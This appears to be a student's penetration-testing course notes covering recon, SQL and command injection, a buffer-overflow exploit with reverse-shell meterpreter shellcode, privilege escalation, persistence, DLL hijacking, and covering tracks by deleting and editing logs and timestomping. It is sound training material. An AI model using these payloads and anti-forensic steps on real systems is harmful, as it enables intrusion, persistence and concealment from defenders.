Great pentesting website: Exploit Database


Section 1: Penetration Testing
- Penetration testing: 6 phases
        - Phase 1: Mission definition (define scope of mission, goals, targets, RoE)
        - Phase 2: Recon (OSINT)
        - Phase 3: Footprinting (scanning/interaction with target/target resources)
        - Phase 4: Exploitation & Initial Access (gaining initial foothold)
        - Phase 5: Post-Exploitation (persistence, priv escalation, covering tracks, exfiltrate target data)
        - Phase 6: Document Mission (document & report mission details)
- Pentest reporting:
        - OPNOTES vs Formalized Reporting
        - Executive Summary (for officers), Technical Summary (for cyber people)
        - Resons to report, what to report, screen captures



Section 2: Scanning & Recon
- Data to collect:
        - Web data: Cached Content, Analytics, Proxy Web Application, Command Line Interrogation
        - Sensitive data: Business Data, Profiles, Non-Profits/Charities, Business Filings, Historical and Public Listings
        - Publicly accessible data: Physical Addresses, Phone Numbers, Email Addresses, User Names, Search Engine Data, Web and Traffic Cameras, Wireless Access Point Data
        - Social media: Twitter, Facebook, Instagram, People Searches, Registry and Wish Lists
        - Domain & IP data: DNS Registration, IP Address Assignments, Geolocation Data, Whois
- HTML: Hyper-Text Markup Language
        - Web browser: client-side interpretation
        - Utilizes elements identified by tags
        - Typically redirects to another page for server-side interaction
        - CSS (cascading sytlesheets) for page themeing
- Scraping Data: see python script
- Advanced Scanning Techniques:
        1. Host Discovery (find hosts that are online - ping)
        2. Port Enumeration (find ports for each host that is online - nmap)
        3. Port Interrogation (find what services are running on each open port - netcat)
- NMAP Scripting Engine: there are benefits to scanning with scripts.
        - located in /usr/share/nmap/scripts
        - NMAP script commands:
                nmap --script <filename>|<category>|<directory>
                nmap --script-help "ftp-* and discovery"
                nmap --script-args <args>
                nmap --script-args-file <filename>
                nmap --script-help <filename>|<category>|<directory>
                nmap --script-trace
        - GREAT HTTP nmap script: nmap --script=http-enum.nse [IP]



Section 3: Vulnerability & Exploitation Research
- Most common method for gaining initial access: Phishing
- Components of exploitation research:
        - Transitioning from recon to weaponization
        - Leveraging intel/data about network
        - Pairing vulnerabilities to exploits
        - Aligning exploits to operational objectives
- Research methods: Open sources / organizational capabilities
        - Capabilities: COMSEC, etc.
- Testing: 
        - Exploit Development comes from vulnerability pairing & mission-driven requirements (test & verify success)
        - Benefits of testing: Faster time to breakout of initial foothold, reduced risk of detection/tool failure, improved recovery time.
- Exploit testing plan components:
        - Procure hardware & software
        - Set up testing environment
        - Assign a developer
        - Assign a tester to develop TTPs & break ot
        - Document results


Section 4: SSH Key Shenanigans via SQL

Run ";whoami" to see if input is vulnerable to SQL command injection

Once at remote commmand injection location:
        Use the sneaky method (;[command]) to cat /etc/passwd and find home directory of www-data
        Upload copy of SSH RSA token to that home directory:
        ls -la /var/www (home dir) to see whether a .ssh file is located in the home dir
        mkdir /var/www/.ssh
ON LOCAL CMD:
        ls -la ../../.ssh/
        ssh-keygen -t rsa -b 4096 (to generate keys in the first place)
        cat ../../.ssh/id_rsa.pub (public - copy EVERYTHING in this file)
        cat ../../.ssh/id_rsa (private)
IN INJECTION SPOT:
        ;echo "[PASTE]" >> /var/www/.ssh/authorized_keys
ON CMD:
        ssh www-data@(target IP) (hijacks this user account on the target)


Section 5: SQL

THE GOLDEN STATEMENT: UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
        - This extracts those 3 crucial pieces of information from the "columns" table within the all-knowing schema (each of these 3 is a column within the "columns" table)
        - TABLE_SCHEMA: Names of all the databases across the entire server
        - TABLE_NAME: Names of all the tables across the entire server
        - COLUMN_NAME: Names of all the columns across the entire server
Golden Statement Process:
        > mysql (actually gets us into the sql server)
        > show databases ; (prints all databases; usually 3 databases by default are information_schema, mysql, performance_scheme)
        > use information_schema ; (reads database info)
        > show tables from information_schema ; (shows all the tables in the database)
                - Very important tables: COLUMNS
        > show columns from columns ; (because there is a column called "columns" within the table called "columns")
        > SELECT table_schema FROM information_schema.columns ; (shows the whole table_schema column from the "columns" table)
                - Important thing about SQL: Due to the relational nature of SQL, there will be many, many duplicates of schema names in this output: one for each table the schema includes.)
        > SELECT table_name FROM information_schema.columns ; 
                - Shows all the tables in the server, you need to have table_schema and table_name output together to see which tables belong to which database)
        > SELECT column_name FROM information_schema.columns ;
                - Shows all the columns in the server, this is the only field that has no duplicate entries since this is the most granular the results get)
        > UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
                - This will let you actually see the whole picture
Attack Steps: (POST)
        1. Identify vulnerable field
                - Throw the exploit for each valid entry (Audi ' OR 1='1)
                - If the query thrown has a \ that you didn't put in there, it automatically escapes single quotes and is not vulnerable)
        2. Identify number of columns
                - Throw a union select (Audi' UNION SELECT 1,2,3,4 #) up to the number of columns you see. "Show query" should show if there are any additional columns
                - Throw the same command but up to 5 columns (if show query showed 5 columns) to test that it worked
        3. Input golden statement, updated to reflect newly known number of columns.
                - If the form expects 5 columns, just add a ",4,5" after the 3 tables in the golden rule (this is junk placeholder - just makes the form happy)
                - Throw this: UNION SELECT table_schema,table_name,column_name,4,5 FROM information_schema.columns
                - Say that the form for some reason refuses to display column 2: instead run this:
                        - UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns
                        - this will put a placeholder in the 2nd column (which is then not displayed) instead of something you actually want to see
Attack Steps (GET)
        1. Utilize dropdown, show query for each one
                - Note how many columns are shown and queried for
        2. Identify vulnerable field
                - In the URL, after "<selection>=", type "4 OR 1=1"
                - Instead of "4", try 1, or 2, or 3, etc; as many numbers as there are columns
        3. Union select
                - Run "selection=3 UNION SELECT 1,2,3,4"
                - Run the same thing up to 5 just to see if there's an extra hidden field (if not, there will be an error message)
                - Now we know how many fields the form expects - only 4, not extra hidden field
        4. Input golden statement
                - Throw this: UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
                - (may be out of order, but whatever. You can just rearrange the order you throw the tables in the statement if you're OCD)
Standard SQL Commands:
        - SELECT: Extracts data from a database (key)
                - Syntax: select movies including the string below
                        SELECT * FROM movies
                        WHERE Title LIKE "%Toy Story%"
        - UNION: Used to COMBINE the result of TWO OR MORE select statements (key)
                - UNION SELECT
        - USE: Selects the DB to use
        - UPDATE: Updates data in a database
        - DELETE: Deletes data from a database
        - INSERT INTO: Inserts new data into a database
        - CREATE DATABASE: Creates a new database
        - ALTER DATABASE: Modifies a database
        - CREATE TABLE: Creates a new table
        - ALTER TABLE: Modifies a table
        - DROP TABLE: Deletes a table
        - CREATE INDEX: Creates an index (search key)
        - DROP INDEX: Deletes an index

- SQL Injection considerations:
        - Requires Valid SQL Queries
        - Fully patched systems CAN BE vulnerable due to misconfiguration
        - Input Field Sanitization
        - String vs Integer values
        - Is INFORMATION_SCHEMA database available? (contains all the tables, column names, etc. - very useful)
        - GET request vs POST request HTTP methods
- Unsanitized vs Sanitized Fields:
        - Unsanitized: input fields can be found using a Single Quote ⇒ '
                - Will return extraneous information
                - ' closes a variable, to allow for additional statements/clauses
                - May show no errors or generic error (harder Injection)
        - Sanitized: input fields are checked for items that might harm the database (Items are removed, escaped, or turned into a single string)
        - Validation: checks inputs to ensure it meets a criteria (String doesn’t contain ')
- Server-Side Query Processing
        - Say that user enters JohnDoe243 in the name form field and pass1234 in the pass form field...
        - The Server-Side Query that would be passed to MySQL from PHP would be:
                - Before input: SELECT id FROM users WHERE name=‘$name’ AND pass=‘$pass’;
                - After input: SELECT id FROM users WHERE name=‘JohnDoe243’ AND pass=‘pass1234’;
- Statement Injection Example: (BYPASSING CREDENTIALS - POST)
        - Say that user enters: tom' OR 1='1 (in the name and pass fields)
                - Truth Statement: tom' OR 1='1
        - Server-Side query executed would appear like this:
                - SELECT id FROM users WHERE name=‘tom' OR 1='1’ AND pass=‘tom' OR 1='1’
- Statement Injection (GET):
        - Type in the POST statement injection into the fields but do not submit
        - Inspect page (F12), go to Network tab
        - Submit form, grab the info on the POST request, click on Request tab on the right, click on Raw option
                - add "?" to the end of the url, then copy-paste the result after that ?
        - This should get you the array of valid SQL queries
- Stacking Statements:
        - You can add in whatever statements you want by utilizing a semi-colon ;
        - User input: Johnny'; DROP TABLE Customers; --
        - Server side: SELECT * FROM user WHERE id=‘Johnny'; DROP TABLE Customers; --’
- Nesting Statements:
        - Some Web Application + SQL Database combinations do not allow stacking, such as PHP and MySQL.
        - Though they may allow for nesting a statement within an existing one:
        - Key User Input: UNION SELECT 1,column_name,3 from information_schema.columns where table_name = 'members'
        - URL: php?key=<value> UNION SELECT 1,column_name,3 from information_schema.columns where table_name = 'members'
- Messing with SQL
        - Using # or -- tells the Database to ignore everything after
        - User input: 1 or 1=1; #
        - Server Side: SELECT product FROM item WHERE id = 1 or 1=1; # limit 1;
                - Now you have unlimited tries!
- Blind Injection:
        - Includes Statements to determine how DB is configured. Essential questions:
                - Columns in output?
                - Can we return errors?
                - Can we return expected output?
        - Used when unsanitized fields give generic error or no messages
        - Normal Query to pull expected output: php?item=4
        - Blind injection for validation: php?item=4 OR 1=1
        - Try ALL combinations! item=1, item=2, item=3, etc.
- Abusing the Client! (GET)
        - Pass the injection through the URL: After the .php?item=4 pass your UNION statement
        - Key User Input: UNION SELECT 1,2,@@version
        - URL: prices.php?item=4 UNION SELECT 1,2,@@version
                - the @@version just queries for the SQL version
- Abusing the Client! (enum)
        - Identifying the schema leads to detailed queries to enumerate the DB
                - Research Database Schemas and what information they provide 
        - Key User Input: UNION SELECT 1,table_name,3 from information_schema.tables where table_schema=database()
        - URL: php?item=4 UNION SELECT 1,table_name,3 from information_schema.tables where table_schema=database()
- Defend!
        - Validate inputs!! Methods differ by software
        - CONCATENATE: turns inputs into single strings or escape characters (messes with the injection process a little)
                - PHP: mysql_real_escape_string
                - SQL: sqlite3_prepare()



Section 6: Reverse Engineering
- X86_64 Assembly
        - There are 16 general purpose 64-Bit registers
        - %rax - the first return register
        - %rbp - the base pointer that keeps track of the base of the stack
        - %rsp - the stack pointer that points to the top of the stack
        - You will see arguments passed to functions as something like: [%ebp-0x8]
- X86_64 Assembly Common Terms:
        - Heap - Memory that can be allocated and deallocated
        - Stack - A contiguous section of memory used for passing arguments
        - General Register - A multipurpose register that can be used by either programmer or user to store data or a memory location address
        - Control Register - A processor register that changes or controls the behavior of a CPU
        - Flags Register - Contains the current state of the processor
- X86_64 Registers:
        - RIP (64b) / EIP (lower 32 bits) / IP (lower 16 bits): Instruction Pointer; holds address for next instruction to be executed (memory offset of the next instruction in the code segment)
- Common Instruction Pointers:
        - MOV: move source to destination
                - works in reverse
                - "mov r15,#" means move the number into register 15
                - "mov m,rax" means move the value in rax to m
        - PUSH: push source onto stack
                - "push r15" means push whatever value is in register 15 to top of the stack (increments stack pointer by 64 bits)
        - POP: pop top of stack to destination
                - "pop r8" means pop the value at the top of the stack into r8 (decrements stack pointer by 64 bits)
        - INC: Increment source by 1
                - "inc r8" means if r8 = 5, r8 now equals 6.
        - DEC: Decrement source by 1
                - "dec r8 means if r8 = 5, r8 now equals 4.
        - ADD: Add source to destination
                - "add r13,64" means if r8 = 5, r8 now equals 69.
        - SUB: Subtract source from destination
                - "sub r13,3" means if r8 = 5, r8 now equals 2.
        - CMP: Compare 2 values by subtracting them and setting the %RFLAGS register. ZeroFlag set means they are the same.
                - "cmp r8,r9" means compare the value of r8 to r9, the zero flag will be set if they are the same and not set if they are different.
        - JMP: Jump to specified location
                - "jmp MEM1" means jump to MEM1
        - JLE: Jump if less than or equal
                - "jle MEM1" means jump to MEM1 if zero flag is set less than or set to equal
        - JE: Jump if equal
                - "je MEM1" means jump to MEM1 if zero flag is set to equal
        - RET: Return out of code
                - generally, rax is set to 0 before exiting code ("exit code 0" = success)
REVERSE ENGINEERING
- Reverse Engineering Workflow (Software)
        - Static: take the program, look at the code
        - Behavioral: put in a sandbox, see what happens
        - Dynamic: put in a debugger
        - Disassembly: put it in a disassembler program to step through assembly on your own
        - Document all findings!!
- Dynamic reverse engineering flow:
        - Perform debugging and/or disassembly
        - Find the success/failure message, then work backwards from there
        - Adjust instructions to get that success message
        - Apply path and save
        - Execute patched binary
- NOTE: strings command is very useful for finding all human-readable text within a exe or other wacky file



Section 7: Exploit Development
- Buffer Overflow common terms:
        - Heap: Memory that can be allocated and deallocated
        - Stack: A contiguous section of memory used for passing arguments
        - Registers: Storage elements as close as possible to the central processing unit (CPU)
        - Instruction Pointer (IP): a.k.a Program Counter (PC), contains the address of next instruction to be executed
        - Stack Pointer (SP): Contains the address of the next available space on the stack
        - Base Pointer (BP): The base of the stack
        - Function: Code that is separate from the main program that is often used to replace code the repeats in order to make the program smaller and more efficient
        - Shellcode: The code that is executed once an exploit successfully takes advantage of a vulnerability
- Buffer Overflow Defenses:
        - Non executable (NX) stack
        - Address Space Layout Randomization (ASLR): makes it harder to predict where the IP will point to next
        - Data Execution Prevention (DEP)
        - Stack Canaries: identify patterns indicating someone is tryin to overflow your stack
        - Position Independent Executable (PIE)
- Technical help: tools such as IDA, GHIDRA, GDB, MONA, IMMUNITY, BASH, PYTHON
- GDB Uses:
        - Installation of Peda Plugin:
                git clone https://github.com/longld/peda.git ~/peda
                echo "source ~/peda/peda.py" >> ~/.gdbinit
        - Common Commands:
                disass <FUNCTION>   #   Disassemble portion of the program
                info <...>  #   Supply info for specific stack areas
                x/256c $<REGISTER>  #   Read characters from specific register
                break <address>  #   Establish a break point
        - run "gdb [file]"
        - Note: gdb [file] (may have to chmod first) is great for running a program in isolation
                - within gdb, do
                - run
                - disass main (disassemble main function - call commands are interesting)
                - disass getuserinput
                - run <<< $(python howdy.py) (to run with a file as input instead of standard input)
        - If you input a shitton of characters and it breaks the system, you can look at the registers to see exactly what characters ended up in which registers - this will let you execute
          a stack overflow!
                - If you see "sub   esp,0x44" that means the buffer overflow is a little under 68
                - Jump ESP tells the computer to execute the top of the stack
                - (on terminal) env - gdb [func] (sets gdb into environental variable version)
                        - show env (removes variables to set a consistent memory location - fuck your presets! no unknown factors!)
                                - unset env LINES
                                - unset env COLUMNS
                - crash the program: run > slkdfjskjdfsjkdhfksjhdfjksdhfjkshdjkfhsdjkfhsjkdfhsjkhdfjkshdfjksdhfjkhsdfjksd (receive segmentation fault)
                        - info proc map (see memory locations of all running processes)
                - search for jump esp command: find /b 0x[first address within the heap], 0x[end of the stack], 0xff, 0xe4
                        - any one of the results will contain the desired command, and should do the trick (must be done in env mode)
                        - might not work the first time, just exit gdb and try again
                - in python:
                        - stack goes last in, first out - if you want 0xf7de3b59, you need to put in "\x59\x3b\xde\xf7
                        buffer = "A" * 62
                        #eip = "BBBB"
                        eip = "\x59\x3b\xde\xf7"
                        #0xf7de3b59 "\x59\x3b\xde\xf7"
                        #0xf7f588ab "\xab\x88\xf5\xf7"
                        #0xf7f645fb "\xfb\x45\xf6\xf7"
                        nop = "\x90" * 5
                        print(buffer + eip + nop)
                - because we're in the environment version, we don't know what the EIP, ESP, etc. are
                - gdb func
                        - run <<< $(python howdy.py)
                - msfconsole (NOT box-specific - you can do this part on any box with metasploit, the key part here is that the shell code is generated based on the command set)
                        - use payload/linux/x86/exec
                        - set CMD whoami
                        - generate -b "\x00" -f python
                        - show options (optional - double check)
                - take the "buf = += b"xlsdjfksd" bullshit from msfcosnole and paste the whole thing into the python program below nop as is. change print statement to (buffer + eip + nop + buf)
                        - may need to redo this up to a dozen times - not all generated buf shellcode will work
                - go back into normal gdb mode (exit env mode)
                - run <<< $(python howdy.py)
                        - note that the program (whoami) will run with whatever permissions of whatever user is running the python program?/gdb program?)


Section 8: Exploit Development?
0. Determine exe of interest (python script)
STATIC ANALYSIS
1. strings [/path/to/exe/file] (determine what file, and if it's made for linux or windows)
DYNAMIC ANALYSIS
2. netstat -antp after running program (look for listening ports created)
2a. wmic process where ExecutablePath='C:\\windows\\system32\\notepad.exe' get ProcessId
3. vim [something.py]
        #!/usr/bin/env python
        import socket
        buf = " "
        s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) ## Creating socket, IPv4 TCP
        s.connect(("192.168.65.10",9999)) ##Define host and port
        print s.recv(1024) ## Print to screen the response
        s.send(buf) ## Send variable buf
        print s.recv(1024) ## Print to screen the response
        s.close() ## Close the socket
4. It says "Enter HELP for help" so change the "buf" variable to "HELP"
5. (vulnerable command is "TRUN [value]" where value = "/.:/")
        buf = "TRUN /.:/"
        buf += "A" * 5000
6. Open Immunity Debugger as admin
        - file > attach > exe (must be running the exe for it to show up)
7. Run the modified python program while debugger is running by pressing little play button (you should see "AAAAAAAAAAAA" in the EAX & ESP)
8. https://wiremask.eu/tools/buffer-overflow-pattern-generator/ (length 5000, copy output)
9. replace "buf += "A" * 5000" with "buf += "[paste]""
10. run again, copy EIP to clipboard, paste into wiremask register value, copy "Offset" value
11. replace "buf += "[paste]"" with "buf += "A" * [offset value]"
        - optionally, add another "buf += "BBBB"" so you can see if it works by looking for an EIP of "42424242" (hex for BBBB)
        - make sure the delete the "BBBB" when you actually run it as an exploit
12. if you got it, it worked. now you can run any command. ta-da!
13. in the long white bar at the bottom of Immunity Debugger, run the command there
        - !mona modules (or any command you want such as...)
        - !mona jmp -r esp -m "essfunc.dll" > right click first entry > copy to clipboard > address
                - convert to little endian ie. 625012A0 -> \xA0\x12\x50\x62
14. add the following to the python, in addition to what's already there:
        buf += "[little endian thingy]"
        buf += "\x90" * 15
15. run the following command on the linux box NOT running the vulnerable exe: msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.26.168 lport=4444 -b "\x00" -f python
        - where lhost is NOT the box running the vulnerable exe (linux box)
16. copy the resulting shellcode EXCEPT the first "buf =b""" line, paste into the python script after all other buffer stuff
        - this buffer code translates to the vuln windows box connecting to a 4444 port on the linux machine, but you need to set up the 4444 listener on linux box first
17. turn off all "virus and threat protection" settings on Windows Defender
18. create 4444 meterpreter listener: run msfconsole on linux box
        > use multi/handler
        > set payload windows/meterpreter/reverse_tcp
        > set LHOST 0.0.0.0
        > set LPORT 4444
        > run
19. hit the little reverse rewind button on Immunity Debugger to reset the program to initial state, then run the python program again
20. Tada! you should have a meterpreter session open on the linux box


Section 9: Post-Exploitation
- Enumeration Commands (Linux // Windows)
        - cat /etc/passwd // net user
        - /etc/hosts
        - ps -elf // tasklist /v
        - chkconfig (SysV) or systemctl --type=service (SystemD) // tasklist /svc
        - ip a // ipconfig /all
        - ls /etc/cron.d OR cat /etc/crontab OR ls -la /var/spool/cron/crontabs
- Using stolen SSH keys:
        - chmod 600 /home/student/stolenkey
        - ssh -i /home/stdent/stolenkey jane@1.2.3.4 (tells SSH to utilize the specified stolen private key to authenticate with the jane@1.2.3.4 public key)
- Nonsense:
ssh -MS /tmp/jump student@10.50.xx.xx ##Tunnel
ssh -S /tmp/jump jump -O forward -D 9050 ## Dynamic forwarding
Found 1.2.3.4, now nmap/nc to find port 22 open
ssh -S /tmp/jump jump -O forward -L4207:1.2.3.4:22 ## Port Forward
scp -P 1212 file.sh student@localhost:/home/student/Documents ## SCP file.sh to remote host


Section 10: Privilege Escalation
- Possible objectives (persistence): Includes these and more
        - Adding/hijacking account
        - Boot process persistence
        - Adding/modifying CRON jobs
        - Adding kernel module w/ a backdoor
        - Setting SUID/SGID bit on a critical command that will allow you to regain root privs if you need to
- Privilege escalation techniques:
        - Sudo -l (find out sudo permissions, can be used for further gimmicks or you might already be able to do everything you need to)
        - SUID/SGID allows a program to make changes as root even if it is not run as root (this is why the passwd command can make changes to the /etc/shadow file even when run as Sonnyjim)
                - search for SUID bit programs: find / -type f -perm /6000 -ls 2>/dev/null (both SUID & SGID)
                - search for SUID bit programs: find / -type f -perm /4000 -ls 2>/dev/null
                - search for SGID bit programs: find / -type f -perm /2000 -ls 2>/dev/null
        - https://gtfobins.github.io/ (great website for finding out how any particular command can be abused to gain privilege escalation if it has sudo/SUID/SGID permissions)
- Insecure permissions: 
        - CRON (cron itself runs as root, so if you can add something in there, you can get it to run that command as root)
                - In particular, if there is a script CRON is set to execute regularly and you have permissions to edit that script, bingo
        - World-Writable Files & Directories (incl. scripts that CRON runs as mentioned above)
                - find / -type f -writable -o -type d -writable 2>/dev/null (world-writable)
                - find / -type f -perm /2 -o -type d -perm /2 2>/dev/null (writable by "others")
        - Dot "." in PATH
                - Make your own binary in the current working directory named the same as a legit binary (must add executable bit - the "x" in rwx - for this to work)
                - Insert "." at the beginning of PATH
                - Shell will look in current working directory first, and the shell will execute your binary
                - Best practice for masquerading is to make the command do what you want silently, then do the actual legit binary action so it looks like all is normal
- Check crontab: crontab -e (minute / hour / day of the month / month / day of the week / [command] )
- Software vulnerabilities
- Unpatched Kernel vulnerabilities
- Choose the means of access that is most commonly used on the network - if RDP is a normal thing, use RDP. If SSH traffic is common, use SSH. etc.


Section 11: Covering Tracks & Masquerading
- Ways to figure out init type:
        ls -latr /proc/1/exe
        stat /sbin/init
        man init
        init --version
        ps 1
- Auditing systemV (ausearch pulls from audit.log):
        ausearch -p 22
        ausearch -m USER_LOGIN -sv no
        ausearch -ua edwards -ts yesterday -te now -i
- Auditing systemD:
        journalctl _TRANSPORT=audit
        journalctl _TRANSPORT=audit | grep 603
- Crucial logs for covering tracks (typically housed in /var/log):
        - auth.log/secure - Logins/authentications
        - lastlog - Each users' last successful login time
        - btmp - Bad login attempts
        - sulog - Usage of SU command
        - utmp - Currently logged in users (W command)
        - wtmp - Permanent record on user on/off
- Working with logs:
        file /var/log/wtmp
        find /var/log -type f -mmin -10 2> /dev/null
        journalctl -f -u ssh
        journalctl -q SYSLOG_FACILITY=10 SYSLOG_FACILITY=4
- Reading files (control output with | and "more")
        cat /var/log/auth.log | egrep -v "opened|closed"
        awk '/opened/' /var/log/auth.log
        last OR lastb OR lastlog
        strings OR dd            # for data files
        more /var/log/syslog
        head/tail
- Cleaning logs: 
        - ALWAYS save the INODE before starting cleaning!
        - Inode is essentially the index of files on the linux file system. Commands like mv, cp, cat will all affect the inode.
        - After finishing cleanup, overwrite the new Inode with the old one to make it look like nothing happened
- Get rid of log: rm -rf /var/log/...
- Clear log: 
        cat /dev/null > /var/log/...
        echo > /var/log/...
- Precise log cleaning (remove - grep): egrep -v '10:49*| 15:15:15' auth.log > auth.log2; cat auth.log2 > auth.log; rm auth.log2
- Precise log cleaning (replace - sed): cat auth.log > auth.log2; sed -i 's/10.16.10.93/136.132.1.1/g' auth.log2; cat auth.log2 > auth.log
- Use Timestomp to change access/modify/change times
        touch -c -t 201603051015 1.txt   # Explicit
        touch -r 3.txt 1.txt    # Reference
- Remote logging: check the /etc/rsyslog.conf (older version) or /etc/rsyslog.d/* (newer versions)
        - Find out which one via: grep "IncludeConfig" /etc/rsyslog.conf
        - Know which server remote logs are being shipped to & which logs are being shipped. Be thorough!
- ALWAYS MAKE BACKUPS OF ANY FILE YOU ARE CHANGING ON A TARGET MACHINE


Section 12: Windows Privilege Escalation
- To check UAC Settings: reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
- When running a program:
        - asInvoker = run as me (no special privs)
        - highestAvailable = run as administrator (admin privs)
- Schtasks vulnerabilities: schtasks /query /fo LIST /v
        - schtasks permission level considerations: what is your objective? do you need to blend in?
- Service vulnerabilities:
        wmic service list full
        sc query
- Vulnerable service steps:
        - Identify Vulnerability
        - Validate permissions
        - Validate Executable Paths
        - Replace with Malicious File
- DLL Hijacking steps:
        - Identify Vulnerability
        - Take advantage of the default search order for DLLs
        - NAME_NOT_FOUND present in executable’s system calls
        - Validate permissions
        - Create and transfer Malicious DLL
- DLL Search Order:
        - HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
        - The directory the the Application was run from (THIS ONE IS CRITICAL)
        - The directory specified in in the C+ function GetSystemDirectory()
        - The directory specified in the C+ function GetWindowsDirectory()
        - The current directory
- Other vulnerabilities: unpatched kernel vulnerabilities, unpatched systems, unpatched applications
- Persistence must survive reboots, credential changes, DHCP IP reassignment, and more
        - Considerations: file naming, file location, timestomping, port selection, etc.
- Critical registry locations:
        - HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
        - HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
        - HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
        - HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
- Services usually run at startup, perform multiple functions, and typically require administrative access to modify in any way
- To make a service with a pre-made exe:
        .\sc.exe create HowdyService binpath="C:\Program Files (x86)\Howdy\howdy.exe" displayname="HowdyService" start=auto
        icacls "C:\Program Files (x86)\Howdy" /grant BUILTIN\Users:W
        - Open "Services" app and scroll down to verify it actually worked and the service exists now
        - Open "Task Scheduler" app -> Create Task -> Change User or Group -> type "System" -> click "Check Names" -> OK ->
        - -> General tab -> Name "HowdyTask
        - -> Triggers tab -> New -> Begin the task "At startup" -> check or uncheck "Enabled" depending on your objective ->
        - -> Actions Tab -> New -> Browse -> Howdy.exe
- To take advantage of a scheduled service task that already exists:
        - Open "Services" app. Anything with no description or otherwise out of place is likely a user-created service that can be taken advantage of
                - Right click -> "Properties" -> look for path to executable & who the service runs as
        - Navigate to the executable path and check write permissions to the folder it's in (if you can make and save a text file, you know you can write to that directory)
        - If you can write to the exe file, 
        net use Z: "\\http://live.sysinternals.com" /persistent:yes
        Z:
        .\Procmon.exe -accepteula
        - Within Process Monitor -> Filter -> Filter ->
        -> Process Name contains howdy.exe -> Add
        -> Result is NAME NOT FOUND -> Add
        -> Path contains .dll -> Add -> Apply -> OK
        - To test, turn off everything in Virus & Threat Protection -> Virus & Threat Protection Settings, in Windows Security app, and then run the exe manually
        - All of the listed dll locations are potential locations where you can create your own DLL that the program will then happily execute
- Craft a payload:
        - (from my local ip) msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\users\student\Desktop\whoami.txt' -f dll > SSPICLI.dll
                - (payload that will run whoami and output it to a txt file you can read)
        - scp student@[local ip]:/home/student/SSPICLI.dll .
        - To kill: (get-process | ?{$_.name -like "howdy"}).kill() (should output a "cannot call a method on null valued expression" error)

Covering Tracks:
- Audit Logging:
        - Show all audit category settings: auditpol /get /category:*
        - Show all failed & successful audits: auditpol /get /category:* | findstr /i "success failure"
- Important Microsoft Event IDs:
        - 4624/4625: Successful/failed login
        - 4720: Account created
        - 4672: Administrative user logged on
        - 7045: Service created
